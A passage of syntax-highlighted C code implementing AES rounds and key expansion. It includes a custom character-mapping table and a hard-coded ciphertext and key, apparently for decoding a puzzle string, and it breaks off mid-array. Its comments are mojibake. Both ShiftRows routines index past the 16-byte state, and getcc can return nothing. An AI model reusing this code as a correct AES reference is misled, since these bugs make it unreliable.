class="hljs-type">void</span> <span class="hljs-title function_">SubBytesRe</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintext, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintextencrypt, <span class="hljs-type">int</span> count)</span><span class="hljs-comment">/*S ç›’é€†ç½®æ¢ */</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> row, column;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Sbox[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123;<br><span class="hljs-number">82</span>, <span class="hljs-number">9</span>, <span class="hljs-number">106</span>, <span class="hljs-number">213</span>, <span class="hljs-number">48</span>, <span class="hljs-number">54</span>, <span class="hljs-number">165</span>, <span class="hljs-number">56</span>, <span class="hljs-number">191</span>, <span class="hljs-number">64</span>, <span class="hljs-number">163</span>, <span class="hljs-number">158</span>, <span class="hljs-number">129</span>, <span class="hljs-number">243</span>, <span class="hljs-number">215</span>, <span class="hljs-number">251</span>, <span class="hljs-number">124</span>, <span class="hljs-number">227</span>, <span class="hljs-number">57</span>, <span class="hljs-number">130</span>, <span class="hljs-number">155</span>, <span class="hljs-number">47</span>, <span class="hljs-number">255</span>, <span class="hljs-number">135</span>, <span class="hljs-number">52</span>, <span class="hljs-number">142</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">196</span>, <span class="hljs-number">222</span>, <span class="hljs-number">233</span>, <span class="hljs-number">203</span>, <span class="hljs-number">84</span>, <span class="hljs-number">123</span>, <span class="hljs-number">148</span>, <span class="hljs-number">50</span>, <span class="hljs-number">166</span>, <span class="hljs-number">194</span>, <span class="hljs-number">35</span>, <span class="hljs-number">61</span>, <span class="hljs-number">238</span>, <span class="hljs-number">76</span>, <span class="hljs-number">149</span>, <span class="hljs-number">11</span>, <span class="hljs-number">66</span>, <span class="hljs-number">250</span>, <span class="hljs-number">195</span>, <span class="hljs-number">78</span>, <span class="hljs-number">8</span>, <span class="hljs-number">46</span>, <span class="hljs-number">161</span>, <span class="hljs-number">102</span>, <span class="hljs-number">40</span>, <span class="hljs-number">217</span>, <span class="hljs-number">36</span>, <span class="hljs-number">178</span>, <span class="hljs-number">118</span>, <span class="hljs-number">91</span>, <span class="hljs-number">162</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">139</span>, <span class="hljs-number">209</span>, <span class="hljs-number">37</span>, <span class="hljs-number">114</span>, <span class="hljs-number">248</span>, <span class="hljs-number">246</span>, <span class="hljs-number">100</span>, <span class="hljs-number">134</span>, <span class="hljs-number">104</span>, <span class="hljs-number">152</span>, <span class="hljs-number">22</span>, <span class="hljs-number">212</span>, <span class="hljs-number">164</span>, <span class="hljs-number">92</span>, <span class="hljs-number">204</span>, <span class="hljs-number">93</span>, <span class="hljs-number">101</span>, <span class="hljs-number">182</span>, <span class="hljs-number">146</span>, <span class="hljs-number">108</span>, <span class="hljs-number">112</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">253</span>, <span class="hljs-number">237</span>, <span class="hljs-number">185</span>, <span class="hljs-number">218</span>, <span class="hljs-number">94</span>, <span class="hljs-number">21</span>, <span class="hljs-number">70</span>, <span class="hljs-number">87</span>, <span class="hljs-number">167</span>, <span class="hljs-number">141</span>, <span class="hljs-number">157</span>, <span class="hljs-number">132</span>, <span class="hljs-number">144</span>, <span class="hljs-number">216</span>, <span class="hljs-number">171</span>, <span class="hljs-number">0</span>, <span class="hljs-number">140</span>, <span class="hljs-number">188</span>, <span class="hljs-number">211</span>, <span class="hljs-number">10</span>, <span class="hljs-number">247</span>, <span class="hljs-number">228</span>, <span class="hljs-number">88</span>, <span class="hljs-number">5</span>, <span class="hljs-number">184</span>, <span class="hljs-number">179</span>, <span class="hljs-number">69</span>, <span class="hljs-number">6</span>, <span class="hljs-number">208</span>, <span class="hljs-number">44</span>, <span class="hljs-number">30</span>, <span class="hljs-number">143</span>, <span class="hljs-number">202</span>, <span class="hljs-number">63</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">193</span>, <span class="hljs-number">175</span>, <span class="hljs-number">189</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">19</span>, <span class="hljs-number">138</span>, <span class="hljs-number">107</span>, <span class="hljs-number">58</span>, <span class="hljs-number">145</span>, <span class="hljs-number">17</span>, <span class="hljs-number">65</span>, <span class="hljs-number">79</span>, <span class="hljs-number">103</span>, <span class="hljs-number">220</span>, <span class="hljs-number">234</span>, <span class="hljs-number">151</span>, <span class="hljs-number">242</span>, <span class="hljs-number">207</span>, <span class="hljs-number">206</span>, <span class="hljs-number">240</span>, <span class="hljs-number">180</span>, <span class="hljs-number">230</span>, <span class="hljs-number">115</span>, <span class="hljs-number">150</span>, <span class="hljs-number">172</span>, <span class="hljs-number">116</span>, <span class="hljs-number">34</span>, <span class="hljs-number">231</span>, <span class="hljs-number">173</span>, <span class="hljs-number">53</span>, <span class="hljs-number">133</span>, <span class="hljs-number">226</span>, <span class="hljs-number">249</span>, <span class="hljs-number">55</span>, <span class="hljs-number">232</span>, <span class="hljs-number">28</span>, <span class="hljs-number">117</span>, <span class="hljs-number">223</span>, <span class="hljs-number">110</span>, <span class="hljs-number">71</span>, <span class="hljs-number">241</span>, <span class="hljs-number">26</span>, <span class="hljs-number">113</span>, <span class="hljs-number">29</span>, <span class="hljs-number">41</span>, <span class="hljs-number">197</span>, <span class="hljs-number">137</span>, <span class="hljs-number">111</span>, <span class="hljs-number">183</span>, <span class="hljs-number">98</span>, <span class="hljs-number">14</span>, <span class="hljs-number">170</span>, <span class="hljs-number">24</span>, <span class="hljs-number">190</span>, <span class="hljs-number">27</span>, <span class="hljs-number">252</span>, <span class="hljs-number">86</span>, <span class="hljs-number">62</span>, <span class="hljs-number">75</span>, <span class="hljs-number">198</span>, <span class="hljs-number">210</span>, <span class="hljs-number">121</span>, <span class="hljs-number">32</span>, <span class="hljs-number">154</span>, <span class="hljs-number">219</span>, <span class="hljs-number">192</span>, <span class="hljs-number">254</span>, <span class="hljs-number">120</span>, <span class="hljs-number">205</span>, <span class="hljs-number">90</span>, <span class="hljs-number">244</span>, <span class="hljs-number">31</span>, <span class="hljs-number">221</span>, <span class="hljs-number">168</span>, <span class="hljs-number">51</span>, <span class="hljs-number">136</span>, <span class="hljs-number">7</span>, <span class="hljs-number">199</span>, <span class="hljs-number">49</span>, <span class="hljs-number">177</span>, <span class="hljs-number">18</span>, <span class="hljs-number">16</span>, <span class="hljs-number">89</span>, <span class="hljs-number">39</span>, <span class="hljs-number">128</span>, <span class="hljs-number">236</span>, <span class="hljs-number">95</span>, <span class="hljs-number">96</span>, <span class="hljs-number">81</span>, <span class="hljs-number">127</span>, <span class="hljs-number">169</span>, <span class="hljs-number">25</span>, <span class="hljs-number">181</span>, <span class="hljs-number">74</span>, <span class="hljs-number">13</span>, <span class="hljs-number">45</span>, <span class="hljs-number">229</span>, <span class="hljs-number">122</span>, <span class="hljs-number">159</span>, <span class="hljs-number">147</span>, <span class="hljs-number">201</span>, <span class="hljs-number">156</span>, <span class="hljs-number">239</span>, <span class="hljs-number">160</span>, <span class="hljs-number">224</span>, <span class="hljs-number">59</span>, <span class="hljs-number">77</span>, <span class="hljs-number">174</span>, <span class="hljs-number">42</span>, <span class="hljs-number">245</span>, <span class="hljs-number">176</span>, <span class="hljs-number">200</span>, <span class="hljs-number">235</span>, <span class="hljs-number">187</span>, <span class="hljs-number">60</span>, <span class="hljs-number">131</span>, <span class="hljs-number">83</span>, <span class="hljs-number">153</span>, <span class="hljs-number">97</span>, <span class="hljs-number">23</span>, <span class="hljs-number">43</span>, <span class="hljs-number">4</span>, <span class="hljs-number">126</span>, <span class="hljs-number">186</span>, <span class="hljs-number">119</span>, <span class="hljs-number">214</span>, <span class="hljs-number">38</span>, <span class="hljs-number">225</span>, <span class="hljs-number">105</span>, <span class="hljs-number">20</span>, <span class="hljs-number">99</span>, <span class="hljs-number">85</span>, <span class="hljs-number">33</span>, <span class="hljs-number">12</span>, <span class="hljs-number">125</span>        &#125;;<span class="hljs-comment">// å¡«å…… Sbox çŸ©é˜µ</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>&#123;<br>row = (plaintext[i] &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>column = plaintext[i] &amp; <span class="hljs-number">0x0F</span>;<br>plaintextencrypt[i] = Sbox[row][column];<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ShiftRowsRe</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintextencrypt)</span><span class="hljs-comment">/* è¡Œç§»ä½çš„é€† */</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<span class="hljs-comment">// ç¬¬ i è¡Œ</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> - i; j++)<span class="hljs-comment">// ç¬¬ j æ¬¡å·¦ç§»</span><br>&#123;<br>temp = plaintextencrypt[i];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++)<br>plaintextencrypt[i + <span class="hljs-number">4</span> * k] = plaintextencrypt[i + <span class="hljs-number">4</span> * (k + <span class="hljs-number">1</span>)];<br>plaintextencrypt[i + <span class="hljs-number">12</span>] = temp;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ShiftRows</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintextencrypt)</span><span class="hljs-comment">/* è¡Œç§»ä½ */</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<span class="hljs-comment">// ç¬¬ i è¡Œ</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<span class="hljs-comment">// ç¬¬ j æ¬¡å·¦ç§»</span><br>&#123;<br>temp = plaintextencrypt[i];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++)<br>plaintextencrypt[i + <span class="hljs-number">4</span> * k] = plaintextencrypt[i + <span class="hljs-number">4</span> * (k + <span class="hljs-number">1</span>)];<br>plaintextencrypt[i + <span class="hljs-number">12</span>] = temp;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title function_">Mult2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> num)</span><span class="hljs-comment">/* åˆ—æ··æ·† */</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> temp = num &lt;&lt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> ((num &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x01</span>)<br>temp = temp ^ <span class="hljs-number">27</span>;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title function_">Mult3</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> num)</span><br>&#123;<br><span class="hljs-keyword">return</span> Mult2(num) ^ num;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MixColumns</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintextencrypt, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintextcrypt)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>plaintextcrypt[<span class="hljs-number">4</span> * i] = Mult2(plaintextencrypt[<span class="hljs-number">4</span> * i]) ^ Mult3(plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>]) ^ plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] ^ plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>];<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>plaintextcrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>] = plaintextencrypt[<span class="hljs-number">4</span> * i] ^ Mult2(plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>]) ^ Mult3(plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>]) ^ plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>];<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>plaintextcrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] = plaintextencrypt[<span class="hljs-number">4</span> * i] ^ plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>] ^ Mult2(plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>]) ^ Mult3(plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>plaintextcrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>] = Mult3(plaintextencrypt[<span class="hljs-number">4</span> * i]) ^ plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>] ^ plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] ^ Mult2(plaintextencrypt[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]);<br>&#125;<br><span class="hljs-comment">/* é€†åˆ—æ··æ·† */</span> <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> xtime(x)   ((x<span class="hljs-string">&lt;&lt;1) ^ (((x&gt;</span>&gt;7) &amp; 1) * 0x1b))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Multiply(x,y) (((y &amp; 1) * x) ^ ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^ ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^ ((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^ ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x))))))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MixColumnsRe</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *state)</span><br>&#123;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a, b, c, d;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>a = state[<span class="hljs-number">4</span>*i];<br>b = state[<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>];<br>c = state[<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>];<br>d = state[<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>];<br>state[<span class="hljs-number">4</span> * i] = Multiply(a, <span class="hljs-number">0x0e</span>) ^ Multiply(b, <span class="hljs-number">0x0b</span>) ^ Multiply(c, <span class="hljs-number">0x0d</span>) ^ Multiply(d, <span class="hljs-number">0x09</span>);<br>state[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>] = Multiply(a, <span class="hljs-number">0x09</span>) ^ Multiply(b, <span class="hljs-number">0x0e</span>) ^ Multiply(c, <span class="hljs-number">0x0b</span>) ^ Multiply(d, <span class="hljs-number">0x0d</span>);<br>state[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] = Multiply(a, <span class="hljs-number">0x0d</span>) ^ Multiply(b, <span class="hljs-number">0x09</span>) ^ Multiply(c, <span class="hljs-number">0x0e</span>) ^ Multiply(d, <span class="hljs-number">0x0b</span>);<br>state[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>] = Multiply(a, <span class="hljs-number">0x0b</span>) ^ Multiply(b, <span class="hljs-number">0x0d</span>) ^ Multiply(c, <span class="hljs-number">0x09</span>) ^ Multiply(d, <span class="hljs-number">0x0e</span>);<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">CharToWord</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *character, <span class="hljs-type">int</span> first)</span><span class="hljs-comment">/* å­—èŠ‚è½¬å­— */</span><br>&#123;<br><span class="hljs-keyword">return</span> (((<span class="hljs-type">int</span>)character[first] &amp; <span class="hljs-number">0x000000ff</span>) &lt;&lt; <span class="hljs-number">24</span>) | (((<span class="hljs-type">int</span>)character[first + <span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x000000ff</span>) &lt;&lt; <span class="hljs-number">16</span>) | (((<span class="hljs-type">int</span>)character[first + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">0x000000ff</span>) &lt;&lt; <span class="hljs-number">8</span>) | ((<span class="hljs-type">int</span>)character[first + <span class="hljs-number">3</span>] &amp; <span class="hljs-number">0x000000ff</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">WordToChar</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> word, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *character)</span><span class="hljs-comment">/* å­—è½¬å­—èŠ‚ */</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; character[i++] = (word &gt;&gt; (<span class="hljs-number">8</span> * (<span class="hljs-number">3</span> - i))) &amp; <span class="hljs-number">0xFF</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ExtendCipherKey</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *CipherKey_word, <span class="hljs-type">int</span> round)</span><span class="hljs-comment">/* å¯†é’¥æ‰©å±• */</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> CipherKeyChar[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;,CipherKeyCharEncrypt[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> Rcon[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x01000000</span>,<span class="hljs-number">0x02000000</span>,<span class="hljs-number">0x04000000</span>,<span class="hljs-number">0x08000000</span>,<span class="hljs-number">0x10000000</span>,<span class="hljs-number">0x20000000</span>,<span class="hljs-number">0x40000000</span>,<span class="hljs-number">0x80000000</span>,<span class="hljs-number">0x1B000000</span>,<span class="hljs-number">0x36000000</span> &#125;;<span class="hljs-comment">// è½®å¸¸é‡</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">4</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (!(i % <span class="hljs-number">4</span>))<br>&#123;<br>WordToChar((CipherKey_word[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">24</span>) | (CipherKey_word[i - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>), CipherKeyChar);<br>SubBytes(CipherKeyChar, CipherKeyCharEncrypt, <span class="hljs-number">4</span>);<br>CipherKey_word[i] = CipherKey_word[i - <span class="hljs-number">4</span>] ^ CharToWord(CipherKeyCharEncrypt, <span class="hljs-number">0</span>) ^ Rcon[round];<br>&#125;<br><span class="hljs-keyword">else</span><br>CipherKey_word[i] = CipherKey_word[i - <span class="hljs-number">4</span>] ^ CipherKey_word[i - <span class="hljs-number">1</span>];<br>&#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>  <span class="hljs-type">void</span> <span class="hljs-title function_">genString</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;<br>       <span class="hljs-type">char</span> *text = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>       &#123;<br>       text[i]=<span class="hljs-number">35</span>+i;<br>       &#125;<br>       <span class="hljs-built_in">puts</span>(text);<br>       <br>&#125;<br><span class="hljs-type">char</span> table[]=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;<br><span class="hljs-type">char</span> res[]=&#123;<span class="hljs-number">0x36</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x8a</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x8c</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0xa5</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xa9</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0xb2</span>,<br><span class="hljs-number">0xb1</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0x97</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x3b</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x9f</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span><br>&#125;;<br><span class="hljs-type">char</span> <span class="hljs-title function_">getcc</span><span class="hljs-params">(<span class="hljs-type">char</span> in)</span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">96</span>; i++)<br>&#123;<br>   <span class="hljs-keyword">if</span> (in==res[i])<br>   &#123;<br>    <span class="hljs-keyword">return</span> table[i];<br>   &#125;<br>   <br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;**************AESåŠ è§£å¯†***************\n&quot;</span>);<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, k;<br><span class="hljs-type">unsigned</span> mm[]=&#123;<span class="hljs-number">0x71</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xfa</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0xf9</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x0b</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0xe7</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0xda</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0xee</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xe7</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0xfa</span>&#125;;<br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> PlainText[<span class="hljs-number">48</span>] =<span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br>    ,<br>CipherKey[<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x05</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x10</span> &#125;,<br>CipherKey1[<span class="hljs-number">16</span>] = &#123;  <span class="hljs-number">0x05</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x10</span>&#125;,<br>PlainText1[<span class="hljs-number">48</span>] = &#123; <br>              <span class="hljs-number">0x71</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xFC</span>, <br>    <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xFD</span>, 